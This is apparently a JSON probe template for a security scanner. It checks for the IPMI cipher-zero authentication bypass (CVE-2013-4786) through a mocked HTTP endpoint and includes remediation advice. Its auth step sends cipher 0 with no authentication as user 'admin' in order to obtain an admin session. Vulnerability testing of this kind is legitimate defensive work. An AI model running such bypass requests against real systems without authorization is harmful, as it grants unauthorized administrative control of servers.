{
  "schema": "inkblade-probe-template-v1",
  "key": "ipmi-cipher-zero-bypass",
  "version": "1.0.0",
  "meta": {
    "name": {
      "zh": "IPMI cipher-zero bypass",
      "en": "IPMI cipher-zero bypass"
    },
    "series": "网络架构",
    "min_level": "利用验证",
    "writes": false,
    "requires": [],
    "surfaces": [],
    "cves": [
      "CVE-2013-4786"
    ],
    "fidelity": "reduced"
  },
  "inputs": {
    "target": {
      "from": "params.target",
      "required": true
    }
  },
  "defaults": {
    "timeout_ms": 5000,
    "tls_verify": false
  },
  "computed": {
    "success": "steps.auth.status == 200 or steps.auth.status == 201"
  },
  "steps": [
    {
      "id": "info",
      "op": "http",
      "method": "GET",
      "url": "{{input.target}}/ipmi/info",
      "save": "info",
      "allow_failure": true
    },
    {
      "id": "auth",
      "op": "http",
      "method": "POST",
      "url": "{{input.target}}/ipmi/rmcp",
      "save": "auth",
      "allow_failure": true,
      "body": {
        "cipher": 0,
        "auth": "none",
        "username": "admin"
      }
    },
    {
      "id": "cleanup",
      "op": "http",
      "method": "POST",
      "url": "{{input.target}}/__cleanup__",
      "body": {
        "marker": "{{ctx.marker}}"
      },
      "save": "cleanup",
      "allow_failure": true,
      "when": "params.cleanup != false"
    }
  ],
  "checks": [
    {
      "id": "target-answered",
      "when": "steps.auth.status != null",
      "message": "target did not answer"
    }
  ],
  "findings": [
    {
      "id": "cve",
      "when": "computed.success",
      "sev": "critical",
      "title": "IPMI cipher zero 认证绕过：建立 admin 会话",
      "detail": "{\"http_status\": 200, \"route\": \"\", \"cipher\": 0, \"privilege\": \"admin\", \"username\": \"admin\", \"session\": \"mock-session\", \"session_established\": true, \"real_protocol\": \"IPMI 2.0 RMCP+ UDP/623（mock 以 HTTP 表达）\", \"cves\": [\"CVE-2013-4786\"], \"exploit_level\": \"full-mock\", \"fix\": \"禁用 cipher 0 / UDP 623；迁移 Redfish 并隔离管理网\", \"verified\": false, \"verification_status\": \"unsupported\", \"verified_cves\": [], \"unverified_cves\": [\"CVE-2013-4786\"], \"verification_cves\": {\"CVE-2013-4786\": \"unsupported\"}, \"verification_evidence\": []}",
      "cves": [
        "CVE-2013-4786"
      ],
      "evidence": "{{steps.auth.sha256}}",
      "mapping": "CVE arsenal / exploit-registry",
      "fix": "禁用 cipher 0 / UDP 623；迁移 Redfish 并隔离管理网",
      "version_matrix": {
        "product": "ipmi",
        "source": "steps.auth.json.version",
        "vulnerable": [
          "*"
        ],
        "note": "CVE-linked version range; refine per advisory"
      }
    },
    {
      "id": "clean",
      "when": "not computed.success",
      "sev": "info",
      "title": "ipmi-cipher-zero-bypass: 未观察到可利用响应（fixed/未部署）",
      "detail": "step=auth status={{steps.auth.status}}"
    }
  ],
  "artifacts": [
    {
      "name": "ipmi-cipher-zero-bypass-trace.json",
      "kind": "json",
      "fields": {
        "module": "'ipmi-cipher-zero-bypass'",
        "success": "computed.success",
        "cves": "[\"CVE-2013-4786\"]",
        "exploit_step": "'auth'",
        "status": "steps.auth.status"
      }
    }
  ],
  "payloads": {
    "benign": {
      "marker": "INKBLADE-BENIGN"
    },
    "attack": {
      "marker": "{{ctx.marker}}",
      "note": "lab replay only"
    }
  },
  "limits": {
    "timeout_ms": 60000,
    "max_http_requests": 32
  }
}
